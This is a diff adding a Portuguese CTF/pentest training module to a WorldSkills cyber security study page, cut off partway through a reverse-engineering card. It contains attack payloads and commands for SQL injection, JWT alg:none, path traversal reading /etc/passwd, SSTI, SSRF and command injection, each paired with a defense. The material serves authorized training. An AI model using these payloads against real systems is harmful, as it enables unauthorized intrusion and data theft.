@@ -374,6 +374,15 @@
     .pbtn{padding:8px 13px;font-size:13px}
     h1{font-size:23px!important}
   }
+
+  /* ===== Prova E: widget de flag ===== */
+  .eflag{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:14px}
+  .eflag input{flex:1;min-width:200px;background:var(--card2);border:1px solid var(--line);border-radius:9px;padding:10px 12px;color:var(--txt);font-family:var(--mono);font-size:13px}
+  .eflag input:focus{outline:none;border-color:var(--acc2)}
+  .eflag button{background:var(--acc);color:#07241a;border:none;border-radius:9px;padding:10px 16px;font-weight:700;cursor:pointer;font-size:13.5px}
+  .eflag button:hover{filter:brightness(1.08)}
+  .eflag .eres{font-size:13.5px;font-weight:600}
+  .eflag .eres.ok{color:var(--acc)} .eflag .eres.no{color:var(--crit)}
 </style>
 </head>
 <body>
@@ -385,7 +394,7 @@
     <button class="pbtn active" data-prova="provaB" type="button">Prova B <span class="st">Security Assessment</span></button>
     <button class="pbtn" data-prova="provaC" type="button">Prova C <span class="st">Incident Response</span></button>
     <button class="pbtn" data-prova="provaD" type="button">Prova D <span class="st">Blue Team &amp; SIEM</span></button>
-    <button class="pbtn" data-prova="provaE" type="button">Prova E <span class="st">em breve</span></button>
+    <button class="pbtn" data-prova="provaE" type="button">Prova E <span class="st">CTF / Pentest</span></button>
     <button class="pbtn" data-prova="provaF" type="button">Prova F <span class="st">em breve</span></button>
   </div>
 </nav>
@@ -4823,8 +4832,498 @@ enabled = true
 </div><!-- /.wrap -->
 </div><!-- /#provaD -->
 <div class="prova-content" id="provaE">
-  <div class="provaempty"><div class="big">🅴</div><h2>Prova E</h2><p>Conteúdo em construção.</p><span class="tag">em breve</span></div>
+<header>
+  <div class="wrap">
+    <div class="brand"><span class="dot"></span> Cyber SENAI Porto · WorldSkills Skill 54 · Prova E — CTF / Pentest</div>
+    <h1>Capture The Flag: <span class="g">do reconhecimento à flag</span></h1>
+    <p class="sub">Módulo ofensivo (Ataque &amp; Defesa) do WorldSkills Cyber Security: reconhecer, explorar e capturar flags — e saber se defender de cada técnica. Metodologia + ferramentas reais de competição.</p>
+    <div style="margin-top:10px;color:var(--mut2);font-size:12.5px">⚠️ Conteúdo ofensivo <b>exclusivamente para laboratório/CTF autorizado</b>. Usar contra terceiros sem permissão é crime (Lei 12.737/2012).</div>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="atabs" id="etabs">
+    <span class="atab active" data-ep="e-fund"><span class="ic">📚</span> Fundamentos</span>
+    <span class="atab" data-ep="e-recon"><span class="ic">🔍</span> Recon</span>
+    <span class="atab" data-ep="e-web"><span class="ic">🌐</span> Web &amp; DB</span>
+    <span class="atab" data-ep="e-crypto"><span class="ic">🔐</span> Cripto</span>
+    <span class="atab" data-ep="e-stego"><span class="ic">🖼️</span> Stego &amp; Forense</span>
+    <span class="atab" data-ep="e-rev"><span class="ic">🧬</span> Reverse &amp; Pwn</span>
+    <span class="atab" data-ep="e-ad"><span class="ic">🪟</span> Windows &amp; AD</span>
+    <span class="atab" data-ep="e-provas"><span class="ic">📝</span> Provas</span>
+  </div>
+
+  <!-- ===== FUNDAMENTOS ===== -->
+  <div class="apanel active" id="e-fund">
+    <div class="disc" style="border-color:var(--acc)">🚩 Um CTF é uma competição onde você resolve desafios de segurança para achar uma <b>flag</b> (ex.: <code class="inl">flag{...}</code>). O segredo não é sorte — é <b>método</b>: reconhecer → enumerar → explorar → escalar → capturar. Esta aba fixa os conceitos; as outras treinam cada técnica.</div>
+
+    <div class="mgroup" style="margin-top:22px"><span class="d"></span>Conceitos-chave <span style="font-size:11px;color:var(--mut2);text-transform:none;letter-spacing:0">— clique para aprofundar</span></div>
+    <div class="gloss" id="econcepts">
+      <div class="gi click popc" data-t="Metodologia de Pentest / CTF"><b>Metodologia</b> — o processo que leva à flag. <span class="more">ⓘ</span>
+        <div class="gx">Todo alvo é atacado na mesma ordem: <b>Reconhecimento</b> (o que existe?) → <b>Enumeração</b> (detalhar serviços/versões) → <b>Descoberta de vulnerabilidade</b> → <b>Exploração</b> (ganhar acesso) → <b>Escalonamento de privilégio</b> (virar root/admin) → <b>Captura da flag</b>.<br><br>Padrões formais: <b>PTES</b>, <b>OSSTMM</b>, <b>NIST SP 800-115</b>, <b>OWASP WSTG</b> (web). A disciplina importa mais que "hackear aleatório": cada comando é um passo do processo.</div>
+      </div>
+      <div class="gi click popc" data-t="Flag"><b>Flag</b> — o objetivo a capturar. <span class="more">ⓘ</span>
+        <div class="gx">A <b>flag</b> é uma string única que prova que você resolveu o desafio, normalmente no formato <code class="inl">flag{texto}</code>, <code class="inl">FLAG{...}</code> ou específico do evento (ex.: <code class="inl">wsentry-1{...}</code> no WorldSkills UK).<br><br>Pode estar em: um arquivo (<code class="inl">/root/flag.txt</code>, <code class="inl">user.txt</code>), na resposta de uma requisição, escondida numa imagem, na memória de um processo, ou ser o resultado de decriptar algo. Você a submete na plataforma para pontuar.</div>
+      </div>
+      <div class="gi click popc" data-t="Jeopardy vs Attack-Defense"><b>Formatos de CTF</b> — Jeopardy e Attack-Defense. <span class="more">ⓘ</span>
+        <div class="gx"><b>Jeopardy:</b> desafios independentes por categoria (Web, Crypto, Pwn, Rev, Forense, Stego, OSINT), cada um valendo pontos. Você resolve na ordem que quiser.<br><br><b>Attack-Defense:</b> cada equipe recebe serviços idênticos; você <b>ataca</b> os serviços dos adversários (rouba flags) e ao mesmo tempo <b>defende/corrige</b> os seus. O WorldSkills usa os dois lados — por isso cada card aqui ensina o ataque <b>e</b> a defesa.</div>
+      </div>
+      <div class="gi click popc" data-t="Identificar antes de atacar"><b>Mentalidade</b> — identificar antes de atacar. <span class="more">ⓘ</span>
+        <div class="gx">O erro de iniciante é sair testando exploits. O especialista primeiro <b>identifica</b> exatamente o que tem pela frente: qual serviço, versão, cifra, formato de arquivo ou arquitetura de binário. Metade da resolução é reconhecer o alvo.<br><br>Em cripto, por exemplo: decodifique primeiro (base64, hex, rot13) e só então assuma que há criptografia. A pergunta certa é sempre "o que é isto?" antes de "como quebro isto?".</div>
+      </div>
+      <div class="gi click popc" data-t="Escopo & Ética"><b>Escopo &amp; Ética</b> — regras de engajamento. <span class="more">ⓘ</span>
+        <div class="gx">Em CTF/pentest você só ataca o que está <b>no escopo autorizado</b>. Sair do alvo, atacar a infraestrutura da competição ou outros competidores é desqualificação (e, fora de lab, crime).<br><br>Pentest profissional segue um <b>contrato (Rules of Engagement)</b> que define alvos, horários, técnicas proibidas e contato de emergência. A mesma técnica é "ética" ou "crime" só pela autorização.</div>
+      </div>
+      <div class="gi click popc" data-t="Red / Blue / Purple Team"><b>Red / Blue / Purple</b> — os times. <span class="more">ⓘ</span>
+        <div class="gx"><b>Red Team</b> ataca (simula o adversário). <b>Blue Team</b> defende, detecta e responde (Provas C e D deste material). <b>Purple Team</b> é a colaboração dos dois: o Red mostra como entrou, o Blue cria a detecção. Esta Prova E é o lado Red — mas cada card fecha com a defesa correspondente (o "roxo").</div>
+      </div>
+    </div>
+
+    <div class="mgroup" style="margin-top:26px"><span class="d"></span>Arsenal por categoria</div>
+    <table class="ftable">
+      <thead><tr><th>Categoria</th><th>Ferramentas principais</th></tr></thead>
+      <tbody>
+        <tr><td class="id">Recon</td><td>nmap, RustScan, AutoRecon, ffuf, feroxbuster, enum4linux-ng</td></tr>
+        <tr><td class="id">Web</td><td>Burp Suite, sqlmap, ffuf, flask-unsign, ysoserial, OWASP ZAP</td></tr>
+        <tr><td class="id">Cripto</td><td>CyberChef, dcode.fr, xortool, RsaCtfTool, SageMath, hashcat, john, hashid</td></tr>
+        <tr><td class="id">Stego/Forense</td><td>file, strings, exiftool, binwalk, steghide, zsteg, stegsolve, foremost, Volatility3, Wireshark</td></tr>
+        <tr><td class="id">Reverse/Pwn</td><td>checksec, Ghidra, radare2, gdb+GEF/pwndbg, pwntools, ROPgadget</td></tr>
+        <tr><td class="id">Windows/AD</td><td>Impacket, BloodHound, CrackMapExec/NetExec, Rubeus, Mimikatz, Evil-WinRM</td></tr>
+      </tbody>
+    </table>
+    <div class="disc" style="margin-top:14px">🎓 <b>Plataformas de treino:</b> PicoCTF (iniciante), TryHackMe, HackTheBox, Root-Me, OverTheWire, CryptoHack (cripto), pwn.college (pwn). Treine o fluxo completo até virar reflexo.</div>
+  </div>
+
+  <!-- ===== RECON ===== -->
+  <div class="apanel" id="e-recon">
+    <div class="disc">🔍 <b>Reconhecimento e Enumeração</b> — você não ataca o que não mapeou. O objetivo é listar portas, serviços, versões e pontos de entrada.</div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">NMAP</span>Varredura de portas e serviços</h3><div class="cat">o comando-base de todo CTF de rede</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>O Nmap descobre o que está vivo e escutando no alvo. Sem saber as portas/versões, você não escolhe o ataque certo. É sempre o primeiro passo.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">nmap</span> -sC -sV -sS -O -p- -Pn -T4 10.10.10.5   <span class="c"># completo (todas as portas)</span>
+<span class="c"># -sC scripts NSE · -sV versões · -p- todas as 65535 · -Pn não pinga</span>
+<span class="k">nmap</span> --script vuln 10.10.10.5               <span class="c"># checagem de vulnerabilidades</span>
+<span class="k">rustscan</span> -a 10.10.10.5 -- -sC -sV            <span class="c"># mais rápido, alimenta o nmap</span></pre></div>
+        <div class="blk"><div class="h ver"><span class="d"></span>O que observar</div><pre># portas abertas + serviço + VERSÃO (ex.: Apache 2.4.49, vsFTPd 2.3.4)
+# versões antigas → buscar exploit público (searchsploit &lt;serviço&gt;)</pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Lado atacante</span>Versão vulnerável exposta → exploit direto para a flag.</div>
+          <div class="r safe"><span class="lab">🟢 Lado defensor</span>Atualizar serviços, fechar portas não usadas, firewall default-deny.</div>
+        </div></div>
+        <button class="trainbtn" data-elab="e-recon" type="button">🎮 Treinar (defesa)</button>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">WEB</span>Enumeração de diretórios e virtual hosts</h3><div class="cat">achar o que não está linkado</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Muitos CTFs escondem painéis, backups e endpoints em caminhos não listados (<code class="inl">/admin</code>, <code class="inl">/backup.zip</code>) ou em subdomínios. Fuzzing descobre esses recursos.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">ffuf</span> -u http://alvo/FUZZ -w /usr/share/wordlists/dirb/common.txt
+<span class="k">feroxbuster</span> -u http://alvo -w wordlist.txt      <span class="c"># recursivo</span>
+<span class="c"># virtual hosts:</span>
+<span class="k">ffuf</span> -u http://alvo -H <span class="s">"Host: FUZZ.alvo"</span> -w subs.txt -fs 0
+<span class="c"># GraphQL introspection, robots.txt, .git/ expostos</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Lado atacante</span><code>/admin</code> ou <code>/.git</code> expostos → código-fonte/flag.</div>
+          <div class="r safe"><span class="lab">🟢 Lado defensor</span>Remover arquivos sensíveis do webroot, bloquear <code>.git</code>, autenticar áreas admin.</div>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">SMB</span>Enumeração de serviços e compartilhamentos</h3></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Serviços como SMB, FTP, SNMP e NFS costumam vazar usuários, shares e arquivos. Enumerar bem muitas vezes já entrega credenciais ou a flag.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">enum4linux-ng</span> -A 10.10.10.5            <span class="c"># usuários, grupos, shares SMB</span>
+<span class="k">smbclient</span> -L //10.10.10.5 -N          <span class="c"># listar shares (sessão nula)</span>
+<span class="k">nmap</span> -p445 --script smb-enum-shares 10.10.10.5
+<span class="k">showmount</span> -e 10.10.10.5                <span class="c"># exports NFS</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Lado atacante</span>Share aberto por sessão nula → arquivos/credenciais.</div>
+          <div class="r safe"><span class="lab">🟢 Lado defensor</span>Desabilitar sessão nula, exigir autenticação, aplicar SMB signing.</div>
+        </div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== WEB ===== -->
+  <div class="apanel" id="e-web">
+    <div class="disc">🌐 <b>Ataque Web &amp; Database</b> — a categoria mais comum de CTF. Base OWASP: SQLi, XSS, LFI, JWT, SSTI, SSRF, XXE, desserialização, command injection. Ferramenta central: <b>Burp Suite</b> (interceptar e alterar requisições).</div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os net">INJEÇÃO</span>SQL Injection → dump do banco</h3><div class="cat">OWASP A03 · CWE-89</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Quando a entrada do usuário entra direto na query SQL, o atacante manipula a consulta para burlar login ou extrair o banco inteiro — onde costuma estar a flag.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="c"># teste manual (login):</span>  admin' OR '1'='1'-- -
+<span class="c"># automatizado:</span>
+<span class="k">sqlmap</span> -u <span class="s">"http://alvo/item.php?id=1"</span> --dbs          <span class="c"># lista bancos</span>
+<span class="k">sqlmap</span> -u <span class="s">"http://alvo/item.php?id=1"</span> -D loja --dump   <span class="c"># extrai dados</span>
+<span class="c"># extração manual via UNION: ' UNION SELECT 1,flag,3 FROM secrets-- -</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Ataque</span><code>' OR '1'='1</code> loga sem senha / banco dumpado → flag.</div>
+          <div class="r safe"><span class="lab">🟢 Defesa</span>Prepared statements (PDO/MySQLi), nunca concatenar entrada, privilégio mínimo no DB.</div>
+        </div></div>
+        <button class="trainbtn" data-elab="e-sqli" type="button">🎮 Treinar (defesa)</button>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os net">AUTH</span>JWT — ataque do algoritmo "none"</h3><div class="cat">token manipulado para virar admin</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>JSON Web Tokens mal validados são um clássico. O ataque <code class="inl">alg: none</code> explora a validação incorreta do header: se o servidor aceita um token "sem assinatura", você reescreve o payload (ex.: <code class="inl">role: admin</code>) e entra.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="c"># decodificar o token (3 partes base64url separadas por ponto):</span>
+<span class="k">flask-unsign</span> --decode --cookie <span class="s">"eyJ..."</span>
+<span class="c"># ataque alg:none -> header {"alg":"none"} + payload {"role":"admin"} + assinatura vazia</span>
+<span class="c"># ou força bruta do segredo HS256:</span>
+<span class="k">hashcat</span> -m 16500 jwt.txt wordlist.txt</pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Ataque</span>Trocar <code>role</code> para admin com <code>alg:none</code> → painel/flag.</div>
+          <div class="r safe"><span class="lab">🟢 Defesa</span>Rejeitar <code>alg:none</code>, fixar o algoritmo no servidor, segredo forte, validar assinatura.</div>
+        </div></div>
+        <button class="trainbtn" data-elab="e-jwt" type="button">🎮 Treinar (defesa)</button>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os net">ARQUIVOS</span>LFI / Path Traversal</h3><div class="cat">ler arquivos do servidor</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Um parâmetro que vira caminho de arquivo sem validação permite ler arquivos fora do site com <code class="inl">../</code> (traversal) ou incluir arquivos (LFI), chegando a credenciais, código-fonte ou a flag.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre>curl <span class="s">"http://alvo/view.php?file=../../../../etc/passwd"</span>
+<span class="c"># wrappers PHP p/ ler código em base64:</span>
+curl <span class="s">"http://alvo/view.php?file=php://filter/convert.base64-encode/resource=index.php"</span>
+<span class="c"># LFI → RCE via log poisoning / wrapper data://</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Ataque</span><code>?file=../../etc/passwd</code> retorna o arquivo → flag/credencial.</div>
+          <div class="r safe"><span class="lab">🟢 Defesa</span><code>basename()</code> + lista de permissões + <code>realpath()</code>; desativar <code>allow_url_include</code>.</div>
+        </div></div>
+        <button class="trainbtn" data-elab="e-lfi" type="button">🎮 Treinar (defesa)</button>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os net">AVANÇADO</span>SSTI · SSRF · Command Injection</h3><div class="cat">os outros vetores de RCE</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Trilogia de RCE em CTF web: <b>SSTI</b> (injeção em template, ex.: <code class="inl">{{7*7}}</code>→49), <b>SSRF</b> (fazer o servidor requisitar <code class="inl">http://169.254.169.254</code> e vazar metadados), <b>Command Injection</b> (<code class="inl">; id</code> num campo que vira comando).</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como testar</div>
+<pre><span class="c"># SSTI:</span>  {{7*7}}  ${7*7}  &lt;%= 7*7 %&gt;   -> se retornar 49, injetável
+<span class="c"># SSRF:</span>  url=http://127.0.0.1:8080/  ·  url=file:///etc/passwd
+<span class="c"># Command Injection:</span>  127.0.0.1; cat /flag.txt   |   | whoami</pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Ataque</span>Payload executa → RCE → <code>cat flag.txt</code>.</div>
+          <div class="r safe"><span class="lab">🟢 Defesa</span>Sandbox de template, lista de permissões de URL/host, <code>escapeshellarg()</code>, APIs nativas sem shell.</div>
+        </div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== CRIPTO ===== -->
+  <div class="apanel" id="e-crypto">
+    <div class="disc">🔐 <b>Criptografia</b> — a regra de ouro: <b>decodifique primeiro</b> (base64/hex/rot13) antes de assumir que é cifra; conte o tamanho do ciphertext (múltiplo de 16 → cifra de bloco). Seu trabalho não é quebrar cripto "em geral", mas achar a <b>falha específica</b> que o autor introduziu.</div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">IDENTIFICAR</span>Reconhecer e decodar</h3><div class="cat">o primeiro passo sempre</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Metade dos desafios de cripto são apenas <b>encoding</b> (base64, hex, ROT13, Morse, Base32) empilhado. Identificar o esquema resolve na hora. Use ferramentas de auto-detecção.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="c"># auto-detecção:</span>  CyberChef "Magic"  ·  dcode.fr (cipher identifier)
+<span class="k">echo</span> <span class="s">"SGVsbG8="</span> | base64 -d            <span class="c"># base64</span>
+<span class="k">echo</span> <span class="s">"<string>"</span> | tr 'A-Za-z' 'N-ZA-Mn-za-m'   <span class="c"># ROT13</span>
+<span class="c"># cifras clássicas: César, Vigenère, Atbash, Rail Fence -> CyberChef/dcode.fr</span></pre></div>
+        <div class="blk"><div class="h ver"><span class="d"></span>Checklist cripto</div><pre># 1) decode (base64/hex/rot13)  2) tamanho múltiplo de 16? (bloco)
+# 3) tem n e e grandes? (RSA)  4) chave repetida? (XOR/Vigenère)</pre></div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">XOR</span>Cifra XOR (chave única/repetida)</h3></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>XOR aparece em um número enorme de desafios. Com chave de 1 byte, basta força bruta nos 256 valores; com chave repetida, o <b>xortool</b> descobre o tamanho e a chave.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="c"># XOR chave única (pwntools):</span>
+python3 -c <span class="s">"from pwn import xor; print(xor(bytes.fromhex('1b2d'), b'flag{'))"</span>
+<span class="c"># XOR chave repetida:</span>
+<span class="k">xortool</span> -c 20 arquivo.bin        <span class="c"># acha tamanho e chave provável</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Técnica</span>Chave curta/reusada → texto claro recuperado (crib dragging com <code>flag{</code>).</div>
+          <div class="r safe"><span class="lab">🟢 Boa prática</span>Nunca usar XOR como "criptografia"; usar AES-GCM com chave aleatória por mensagem.</div>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">RSA</span>Ataques a RSA fraco</h3><div class="cat">o terror que não é tão assustador</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>RSA em CTF quase nunca é "quebrar RSA" — é explorar um parâmetro fraco: N pequeno/já fatorado, expoente <code class="inl">e=3</code> baixo, módulo comum, Wiener (d pequeno). Ferramentas automatizam quase tudo.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="c"># canivete suíço de RSA (tenta dezenas de ataques):</span>
+<span class="k">RsaCtfTool.py</span> -n &lt;N&gt; -e &lt;e&gt; --uncipher &lt;c&gt;
+<span class="k">RsaCtfTool.py</span> --publickey pub.pem --uncipherfile cipher.bin
+<span class="c"># N já fatorado online:</span>  factordb.com
+<span class="c"># extrair n,e do PEM:</span>  openssl rsa -pubin -in key.pub -text -noout</pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Técnica</span>N pequeno/fatorado → chave privada reconstruída → flag decriptada.</div>
+          <div class="r safe"><span class="lab">🟢 Boa prática</span>N ≥ 2048 bits, <code>e=65537</code>, padding OAEP, não reusar primos/módulo.</div>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">HASH</span>Quebra de hash e senhas</h3></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Hashes (MD5, SHA, NTLM) e arquivos protegidos por senha caem com wordlist + GPU. Primeiro <b>identifique</b> o tipo, depois quebre.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">hashid</span> &lt;hash&gt;                              <span class="c"># identifica o tipo</span>
+<span class="k">hashcat</span> -m 0 -a 0 hash.txt rockyou.txt      <span class="c"># MD5 (GPU)</span>
+<span class="k">john</span> --wordlist=rockyou.txt --format=raw-md5 hash.txt
+<span class="c"># arquivos protegidos: zip2john/gpg2john/ssh2john -> john/hashcat</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Técnica</span>Hash fraco + senha comum → quebrada em segundos.</div>
+          <div class="r safe"><span class="lab">🟢 Boa prática</span>bcrypt/argon2 com salt, senhas longas, não usar MD5/SHA1 para senha.</div>
+        </div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== STEGO & FORENSE ===== -->
+  <div class="apanel" id="e-stego">
+    <div class="disc">🖼️ <b>Esteganografia &amp; Forense</b> — flags escondidas em arquivos, imagens, memória e tráfego. A disciplina é metódica: testar ferramentas em ordem até algo aparecer.</div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">TRIAGEM</span>Os 4 comandos obrigatórios</h3><div class="cat">rode em TODO arquivo recebido</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Ao receber qualquer arquivo, rode os quatro imediatamente: <code class="inl">file</code> (confirma o tipo real), <code class="inl">exiftool</code> (metadados), <code class="inl">strings</code> (texto embutido) e <code class="inl">binwalk</code> (arquivos aninhados). Muitas flags aparecem em menos de dois minutos.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">file</span> alvo.jpg          <span class="c"># o tipo real (extensão mente)</span>
+<span class="k">exiftool</span> alvo.jpg      <span class="c"># metadados (autor, comentário, GPS)</span>
+<span class="k">strings</span> -n 6 alvo.jpg  <span class="c"># texto legível (flag{...}?)</span>
+<span class="k">binwalk</span> -e alvo.jpg    <span class="c"># extrai arquivos escondidos/anexados</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Técnica</span>Flag em metadado, string ou ZIP anexado ao final da imagem.</div>
+          <div class="r safe"><span class="lab">🟢 Boa prática</span>Limpar metadados de arquivos publicados (<code>exiftool -all=</code>).</div>
+        </div></div>
+        <button class="trainbtn" data-elab="e-stego" type="button">🎮 Treinar</button>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">IMAGEM/ÁUDIO</span>Esteganografia por formato</h3></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Cada formato tem sua ferramenta: <b>JPG/WAV</b> → steghide; <b>PNG/BMP</b> → zsteg (detecta LSB); análise visual de planos de bit → Stegsolve; áudio → espectrograma no Sonic Visualiser.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">steghide</span> extract -sf alvo.jpg          <span class="c"># JPG/WAV (tenta senha vazia)</span>
+<span class="k">stegseek</span> alvo.jpg rockyou.txt          <span class="c"># força bruta da senha</span>
+<span class="k">zsteg</span> alvo.png                         <span class="c"># PNG/BMP (LSB)</span>
+<span class="k">stegsolve</span>                             <span class="c"># GUI: planos de bit</span>
+<span class="c"># áudio: abrir no Sonic Visualiser e ver o espectrograma</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Técnica</span>Flag no LSB do PNG, embutida com steghide, ou desenhada no espectrograma.</div>
+          <div class="r safe"><span class="lab">🟢 Nota</span>Esteganografia não é criptografia — não protege segredo real, só o esconde.</div>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os win">MEMÓRIA</span>Forense de memória (Volatility 3)</h3></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Dumps de memória (<code class="inl">.raw</code>, <code class="inl">.dmp</code>, <code class="inl">.vmem</code>) guardam processos, comandos, conexões e até senhas/flags. O Volatility 3 é o padrão.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">vol</span> -f mem.dmp windows.info        <span class="c"># confirma o SO</span>
+<span class="k">vol</span> -f mem.dmp windows.pstree      <span class="c"># processos (pai-filho suspeito)</span>
+<span class="k">vol</span> -f mem.dmp windows.cmdline     <span class="c"># linha de comando usada</span>
+<span class="k">vol</span> -f mem.dmp windows.netscan     <span class="c"># conexões de rede</span>
+<span class="k">vol</span> -f mem.dmp windows.filescan | grep -i flag</pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Técnica</span>Flag/senha num processo, cmdline ou arquivo em memória.</div>
+          <div class="r safe"><span class="lab">🟢 Nota (Blue)</span>Liga com a Prova C/D: memória revela malware fileless.</div>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os net">REDE</span>Análise de PCAP</h3></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Capturas de rede (<code class="inl">.pcap</code>) contêm credenciais em claro, arquivos transferidos e flags no payload. Wireshark (GUI) e tshark (CLI) extraem tudo.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">wireshark</span> captura.pcap              <span class="c"># seguir TCP stream (clique direito)</span>
+<span class="k">tshark</span> -r captura.pcap -Y http -T fields -e http.file_data
+<span class="c"># exportar objetos HTTP (arquivos transferidos):</span>
+<span class="c"># Wireshark &gt; File &gt; Export Objects &gt; HTTP</span>
+<span class="k">strings</span> captura.pcap | grep -i flag</pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Técnica</span>Credencial em FTP/HTTP claro, arquivo exfiltrado, flag no stream.</div>
+          <div class="r safe"><span class="lab">🟢 Defesa</span>Cifrar tudo em trânsito (TLS/SSH) — tráfego claro é leitura aberta.</div>
+        </div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== REVERSE & PWN ===== -->
+  <div class="apanel" id="e-rev">
+    <div class="disc">🧬 <b>Reverse Engineering &amp; Pwn</b> — entender e explorar binários compilados. Reverse = compreender a lógica; Pwn = corromper a memória para executar o que você quer. Exige base de assembly.</div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">TRIAGEM</span>Primeira análise do binário</h3><div class="cat">checksec é obrigatório</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Antes de explorar, você precisa saber as <b>proteções</b> do binário — elas decidem a técnica. O <code class="inl">checksec</code> mostra NX, Stack Canary, PIE e RELRO.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">file</span> ./desafio               <span class="c"># 32 ou 64 bits? (muda a exploração)</span>
